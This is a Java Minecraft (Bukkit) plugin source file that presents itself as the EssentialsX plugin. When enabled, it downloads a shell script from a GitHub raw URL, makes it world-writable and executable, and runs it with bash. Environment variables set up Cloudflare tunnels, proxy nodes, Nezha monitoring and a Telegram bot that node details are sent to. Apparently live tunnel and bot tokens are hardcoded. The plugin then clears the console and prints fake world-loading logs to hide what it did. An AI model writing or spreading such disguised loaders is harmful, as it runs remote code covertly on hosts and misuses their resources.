package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process scriptProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;

    private static final String SCRIPT_URL = "https://raw.githubusercontent.com/dsadsadsss/java-wanju/refs/heads/main/start.sh";

    private static final String[] ALL_ENV_VARS = {
        // CF隧道
        "TOK", "ARGO_DOMAIN",
        // echw / ech 代理连接隧道
        "ECHW_DOM", "ECHW_KEY", "ECH_DOM", "ECH_KEY",
        // TG通知 / 订阅上传
        "TG", "SUB_URL",
        // 哪吒
        "NEZHA_SERVER", "NEZHA_KEY", "NEZHA_PORT", "NEZHA_TLS", "AGENT_UUID",
        // 节点相关
        "TMP_ARGO", "EKEY", "VL_PORT", "VM_PORT", "CF_IP", "SUB_NAME",
        "UUID", "SNI", "HOST",
        // 端口 / 模拟启动游戏
        "tuic_port", "hy2_port", "JAR_SH"
    };

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // Start script
        try {
            startScriptProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start script process: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startScriptProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }

        // Download script
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path scriptFile = tmpDir.resolve("plugin");

        // getLogger().info("Downloading plugin script...");
        try (InputStream in = new URL(SCRIPT_URL).openStream()) {
            Files.copy(in, scriptFile, StandardCopyOption.REPLACE_EXISTING);
        }

        // Set 777 permission
        File file = scriptFile.toFile();
        file.setReadable(true, false);
        file.setWritable(true, false);
        file.setExecutable(true, false);

        // Alternative method to ensure 777 permissions on Unix-like systems
        try {
            Runtime.getRuntime().exec(new String[]{"chmod", "777", scriptFile.toString()}).waitFor();
        } catch (Exception e) {
            // Ignore if chmod command is not available (e.g., on Windows)
        }

        // Prepare process builder to run bash script
        ProcessBuilder pb = new ProcessBuilder("/bin/bash", scriptFile.toString());
        pb.directory(tmpDir.toFile());

        // Set environment variables
        Map<String, String> env = pb.environment();

        // Set default values

        // =======CF隧道设置（填了则使用固定隧道，否则使用临时隧道）
        env.put("TOK", "eyJhIjoiNTQ4ZmE0ZDM5MmNkMzc5NmJjODYwYmQwYWVjYWRhODgiLCJ0IjoiMTliYWYwNDQtNzhjZi00MjJkLWJlMTEtMWRhM2Y5YWMzMDc3IiwicyI6Ik9HUmxNVGM1TWpFdE5UWXhOQzAwTmpBd0xUaGlaalV0WW1Kak5HRTFPRGMzWW1SaiJ9");//固定隧道token
        env.put("ARGO_DOMAIN", "zxc.88k.qzz.io");//固定隧道域名

        // =======echw代理连接隧道，使用 https://github.com/dsadsadsss/ech-ws-nodejs-python.git 部署的节点
        env.put("ECHW_DOM", "");//格式： 网址:443
        env.put("ECHW_KEY", "");//密钥

        // =======ech代理连接隧道
        env.put("ECH_DOM", "");//格式： 网址:443
        env.put("ECH_KEY", "");//密钥

        // =======节点上传TG，格式: "CHAT_ID BOT_TOKEN"，中间是空格
        env.put("TG", "6281575765 7230058241:AAF6gXx5XMqvbrJ8neanWNIiI0tnxNY3xKI");

        // =======节点上传订阅服务器（搭建：https://github.com/dsadsadsss/workers-sub-for-wanju.git）
        env.put("SUB_URL", "");

        // =======哪吒相关设置，支持V0和V1
        env.put("NEZHA_SERVER", "");//v0设置域名，v1设置域名:端口
        env.put("NEZHA_KEY", "");//v1进后台复制安装命令中的NZ_CLIENT_SECRET值
        env.put("NEZHA_PORT", "443");//v0填，v1不填
        env.put("NEZHA_TLS", "1");//1启用tls,0关闭tls
        env.put("AGENT_UUID", "");//哪吒v1固定的ID，留空随机

        // ======节点相关设置(节点可在worlds文件里list.log查看)
        env.put("TMP_ARGO", "vms");         // 节点类型, 可选vls,vms,spl,xhttp,rel,hy2,tuic,sock,3x,ech
        env.put("EKEY", "ech123456");       // ech密钥,留空随机
        env.put("VL_PORT", "");        // vless 端口 (reality 使用此端口)
        env.put("VM_PORT", "8001");         // vmes 端口
        env.put("CF_IP", "ip.sb");          // cf优选域名或ip
        env.put("SUB_NAME", "argo");        // 节点名称,配合哪吒面板v1可以自动设置面板名称
        env.put("UUID", "7afe4f85-4168-4216-88b8-0d2c077c0173"); // 设置节点固定的UUID, 留空则使用随机UUID
        env.put("SNI", "");                 // 指定reality借用的tls网站,留空使用默认
        env.put("HOST", "");                // 指定hy2,tuic,reality使用的ip或域名,留空自动获取

        // ======端口设置(hy2,tuic,3x,rel几种协议不能同时开启真实游戏，因为游戏会占用端口)
        env.put("hy2_port", "28156");//hy2端口，留空则自动获取游戏端口
        env.put("tuic_port", "");//tuic端口，注意不要和游戏端口冲突

        // =======模拟启动游戏(留空则显示启动日志)，也可以换成别的命令，如sleep 5
        env.put("JAR_SH", "moni");

        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // Load from .env file with priority order
        loadEnvFileFromMultipleLocations(env);

        // Load from Bukkit configuration file (highest priority)
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        // Start process
        scriptProcess = pb.start();
        isProcessRunning = true;

        // Start a monitor thread
        startProcessMonitor();
        // getLogger().info("plugin script is running");

        // Sleep 20 seconds
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }

        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        Path loadedEnvFile = null;

        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
                }
            }
        }

        // if (loadedEnvFile == null) {
        //     getLogger().info("No .env file found in any of the checked locations");
        // }
    }

    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }

            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("TOK") || key.contains("TG") ? "***" : value));
                }
            }
        }
    }

    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = scriptProcess.waitFor();
                isProcessRunning = false;
                // getLogger().info("plugin script process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Script-Process-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");

        shouldRun = false;

        if (scriptProcess != null && scriptProcess.isAlive()) {
            // getLogger().info("Stopping script process...");
            scriptProcess.destroy();

            try {
                if (!scriptProcess.waitFor(10, TimeUnit.SECONDS)) {
                    scriptProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated script process");
                } else {
                    getLogger().info("Script process stopped normally");
                }
            } catch (InterruptedException e) {
                scriptProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }

        getLogger().info("EssentialsX plugin disabled");
    }
}
